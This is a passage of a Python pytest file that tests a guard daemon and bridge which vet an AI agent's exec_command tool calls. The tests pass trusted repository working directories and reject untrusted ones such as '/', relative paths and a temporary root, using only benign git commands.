    session_workspace = tmp_path / "projects"
    repository = session_workspace / "example"
    repository.mkdir(parents=True)
    _ = subprocess.run(["git", "init", "--quiet", str(repository)], check=True)
    _ = subprocess.run(
        ["git", "-C", str(repository), "remote", "add", "origin", "https://github.com/example/project.git"],
        check=True,
    )
    guard_config = load_guard_config(guard_home)
    assert guard_config.mode == "prompt"
    assert guard_config.security_level == "balanced"
    daemon = GuardDaemonServer(GuardStore(guard_home), host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)
    config = _bridge_config(guard_home, daemon.port)
    config["query"] = urlencode({"guard-home": str(guard_home), "home": str(tmp_path)})
    config["fallback_command"] = [sys.executable, "-c", "raise SystemExit(1)"]
    monkeypatch.setattr(
        "sys.stdin",
        io.StringIO(
            json.dumps(
                {
                    "hook_event_name": "PreToolUse",
                    "tool_name": "exec_command",
                    "tool_input": {"cmd": "git fetch origin main", "workdir": str(repository)},
                    "cwd": str(session_workspace),
                }
            )
        ),
    )

    try:
        exit_code = bridge.main(**config)
    finally:
        daemon.stop()

    assert exit_code == 0
    assert json.loads(capsys.readouterr().out) == {}


@pytest.mark.parametrize("workdir", ("relative/repository", "/"))
def test_bridge_real_daemon_rejects_untrusted_exec_command_workdir(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
    workdir: str,
) -> None:
    guard_home = tmp_path / "guard-home"
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    daemon = GuardDaemonServer(GuardStore(guard_home), host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)
    config = _bridge_config(guard_home, daemon.port)
    config["query"] = urlencode({"guard-home": str(guard_home), "home": str(tmp_path)})
    config["fallback_command"] = [sys.executable, "-c", "raise SystemExit(1)"]
    monkeypatch.setattr(
        "sys.stdin",
        io.StringIO(
            json.dumps(
                {
                    "hook_event_name": "PreToolUse",
                    "tool_name": "exec_command",
                    "tool_input": {"cmd": "git status --short", "workdir": workdir},
                    "cwd": str(workspace),
                }
            )
        ),
    )

    try:
        exit_code = bridge.main(**config)
    finally:
        daemon.stop()

    assert exit_code == 0
    assert json.loads(capsys.readouterr().out) != {}


def test_bridge_real_daemon_rejects_temp_root_workdir_without_falling_back_to_repository(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    guard_home = tmp_path / "guard-home"
    repository = tmp_path / "repository"
    repository.mkdir()
    _ = subprocess.run(["git", "init", "--quiet", str(repository)], check=True)
    _ = subprocess.run(
        ["git", "-C", str(repository), "remote", "add", "origin", "https://github.com/example/project.git"],
        check=True,
    )
    temporary_root = trusted_temporary_root_for_path(tmp_path)
    assert temporary_root is not None
    daemon = GuardDaemonServer(GuardStore(guard_home), host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)
    config = _bridge_config(guard_home, daemon.port)
    config["query"] = urlencode({"guard-home": str(guard_home), "home": str(tmp_path)})
    config["fallback_command"] = [sys.executable, "-c", "raise SystemExit(1)"]
    monkeypatch.setattr(
        "sys.stdin",
        io.StringIO(
            json.dumps(
                {
                    "hook_event_name": "PreToolUse",
                    "tool_name": "exec_command",
                    "tool_input": {"cmd": "git fetch origin main", "workdir": str(temporary_root)},
                    "cwd": str(repository),
                }
            )
        ),
    )

    try:
        exit_code = bridge.main(**config)
    finally:
        daemon.stop()

    assert exit_code == 0
    assert json.loads(capsys.readouterr().out) != {}


def test_bridge_real_daemon_ignores_workdir_for_opaque_tool(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    guard_home = tmp_path / "guard-home"
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    daemon = GuardDaemonServer(GuardStore(guard_home), host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)
    config = _bridge_config(guard_home, daemon.port)
    config["query"] = urlencode({"guard-home": str(guard_home), "home": str(tmp_path)})
    config["fallback_command"] = [sys.executable, "-c", "raise SystemExit(1)"]
    monkeypatch.setattr(
        "sys.stdin",
        io.StringIO(
            json.dumps(
                {
                    "hook_event_name": "PreToolUse",
                    "tool_name": "opaque_tool",
                    "tool_input": {"command": "git status --short", "workdir": "/"},
                    "cwd": str(workspace),
                }
            )
        ),
    )

    try:
        exit_code = bridge.main(**config)
    finally:
        daemon.stop()

    assert exit_code == 0
    assert json.loads(capsys.readouterr().out) == {}
